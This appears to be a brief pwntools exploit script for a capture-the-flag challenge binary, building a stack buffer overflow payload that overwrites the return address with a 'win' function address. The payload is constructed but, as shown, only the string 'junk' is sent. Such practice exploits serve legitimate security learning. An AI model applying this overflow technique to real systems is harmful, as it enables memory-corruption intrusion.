from pwn import *

p = process('./chall_10')

# no canary (BOF), no pie (BOF), RELRO (got)

win_func = 0x080484d6

offset = 0x3a + 0x4

payload = cyclic(offset) + p32(win_func) + p32(0x0) + p32(0xdeadbeef)

p.sendline(b'junk')